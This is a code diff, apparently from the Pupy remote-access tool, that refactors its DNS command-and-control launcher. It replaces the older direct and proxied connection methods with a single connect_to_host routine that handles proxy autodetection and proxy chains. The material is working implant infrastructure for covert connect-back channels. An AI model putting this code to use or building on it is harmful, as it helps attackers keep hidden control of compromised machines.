@@ -7,12 +7,10 @@ from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
 from ..picocmd.client import DnsCommandsClient
 from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort
 
-from ..proxies import get_proxies, find_default_proxy
+from ..proxies import find_proxies_for_transport, connect_client_with_proxy_info
+from ..utils import create_client_transport_info_for_addr, HostInfo
 
-from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
-
-from ..clients import PupyTCPClient, PupySSLClient
-from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
+from ..socks import ProxyError
 
 from ..online import PortQuiz, check
 from ..scan import scan
@@ -33,14 +31,6 @@ from network.lib import getLogger
 
 logger = getLogger('dnscnc')
 
-def find_proxies(additional_proxies=None):
-    proxy_info = find_default_proxy()
-    if proxy_info:
-        yield proxy_info
-
-    for proxy_info in get_proxies(additional_proxies=additional_proxies):
-        if proxy_info:
-            yield proxy_info
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
@@ -256,111 +246,6 @@ class DNSCncLauncher(BaseLauncher):
             help='DNS query type (For now only A supported)'
         )
 
-    def try_direct_connect(self, command):
-        _, host, port, transport, _ = command
-        t = self.transports[transport](
-            bind_payload=self.connect_on_bind_payload
-        )
-
-        transport_args = {
-            k:v for k,v in t.client_transport_kwargs.iteritems()
-        }
-
-        transport_args['host'] = '{}{}'.format(
-            host, ':{}'.format(port) if port != 80 else ''
-        )
-
-        client = t.client()
-        s = None
-        stream = None
-
-        try:
-            s = client.connect(host, port)
-            stream = t.stream(s, t.client_transport, transport_args)
-        except socket.error as e:
-            logger.error('Couldn\'t connect to %s:%s transport: %s: %s',
-                host, port, transport, e)
-
-        except Exception, e:
-            logger.exception(e)
-
-        return stream
-
-    def try_connect_via_proxy(self, command):
-        _, host, port, transport, connection_proxy = command
-        if connection_proxy is True:
-            connection_proxy = None
-
-        for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
-               additional_proxies=[connection_proxy] if connection_proxy else None
-        ):
-            t = self.transports[transport](
-                bind_payload=self.connect_on_bind_payload
-            )
-
-            transport_args = {
-                k:v for k,v in t.client_transport_kwargs.iteritems()
-            }
-
-            transport_args['host'] = '{}{}'.format(
-                host, ':{}'.format(port) if port != 80 else ''
-            )
-
-            if proxy_type.upper() not in t.internal_proxy_impl:
-                if t.client is PupyTCPClient:
-                    t.client = PupyProxifiedTCPClient
-                elif t.client is PupySSLClient:
-                    t.client = PupyProxifiedSSLClient
-                else:
-                    return
-
-            s = None
-            stream = None
-
-            proxy_addr, proxy_port = proxy.rsplit(':', 1)
-            proxy_port = int(proxy_port)
-
-            transport_args['proxy'] = True
-
-            if proxy_password or proxy_username:
-                transport_args['auth'] = (proxy_username, proxy_password)
-
-            transport_args['connect'] = host, port
-
-            try:
-                if proxy_type.upper() not in t.internal_proxy_impl:
-                    client = t.client(
-                        proxy_type=proxy_type.upper(),
-                        proxy_addr=proxy_addr,
-                        proxy_port=proxy_port,
-                        proxy_username=proxy_username,
-                        proxy_password=proxy_password
-                    )
-                else:
-                    client = t.client()
-                    host = proxy_addr
-                    port = proxy_port
-
-                s = client.connect(host, port)
-                stream = t.stream(s, t.client_transport, transport_args)
-
-            except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
-                if proxy_username and proxy_password:
-                    proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
-                else:
-                    proxy_auth = ''
-
-                logger.error('Couldn\'t connect to {}:{} transport: {} '
-                                  'via {}://{}{}: {}'.format(
-                    host, port, transport,
-                    proxy_type, proxy_auth, proxy,
-                    e
-                ))
-
-            except Exception, e:
-                logger.exception(e)
-
-            yield stream
 
     def iterate(self):
         import sys
@@ -420,29 +305,83 @@ class DNSCncLauncher(BaseLauncher):
 
         return connection
 
+    def connect_to_host(self, host_info, transport, proxies):
+        logger.info('connecting to %s:%d using transport %s ...',
+            host_info.host, host_info.port, transport)
+
+        transport_info = create_client_transport_info_for_addr(
+            transport, host_info
+        )
+
+        logger.info('using client options: %s', transport_info.client_args)
+        logger.info('using transports options: %s', transport_info.transport_args)
+
+        auto = True
+
+        if proxies is False:
+            auto = False
+            proxies = None
+        elif proxies is True:
+            proxies = None
+
+        proposed_proxy_infos = find_proxies_for_transport(
+            transport_info, host_info,
+            wan_proxies=proxies,
+            auto=auto
+        )
+
+        for proxy_info in proposed_proxy_infos:
+            try:
+                yield connect_client_with_proxy_info(
+                    transport_info, proxy_info)
+
+            except (ProxyError, EOFError) as e:
+                logger.info(
+                    'Connection to %s:%d using %s failed: %s',
+                    host_info.host, host_info.port, proxy_info.chain, e
+                )
+            except Exception as e:
+                logger.exception(e)
+
+
     def on_connect(self, command):
         logger.debug('processing connection command')
 
         stream = None
         transport = None
 
-        logger.debug('connection proxy: %s', command[4])
-        if command[4]:
-            logger.debug('omit direct connect')
-            stream = None
-        else:
-            logger.debug('try direct connect')
-            stream = self.try_direct_connect(command)
+        _, host, port, transport, connection_proxy = command
 
-        if not stream and command[4] is not False:
-            logger.debug('try connect via proxy')
-            for stream in self.try_connect_via_proxy(command):
-                if stream:
-                    break
-
-        if stream:
-            transport = command[3]
+        if connection_proxy is None:
+            logger.debug('Connection proxy: autodetect')
+        elif connection_proxy is True:
+            logger.debug('Connection proxy: omit direct')
+        elif connection_proxy is False:
+            logger.debug('Connection proxy: disabled')
+        elif len(connection_proxy) == 1:
+            logger.debug('Connection proxy: one: %s', connection_proxy[0])
         else:
-            logger.debug('all connection attempt has been failed')
+            logger.debug('Connection proxy: chain: %s', connection_proxy)
+
+        host_info = HostInfo(host, port)
+        streams_iterator = self.connect_to_host(
+            host_info, transport, connection_proxy)
+
+        while True:
+            try:
+                stream = next(streams_iterator)
+                break
+
+            except EOFError as e:
+                logger.info('Connection closed: %s', e)
+
+            except StopIteration:
+                break
+
+            except Exception as e:
+                logger.exception(e)
+
+        if not stream:
+            logger.debug('All connection attempt has been failed')
 
         return stream, transport
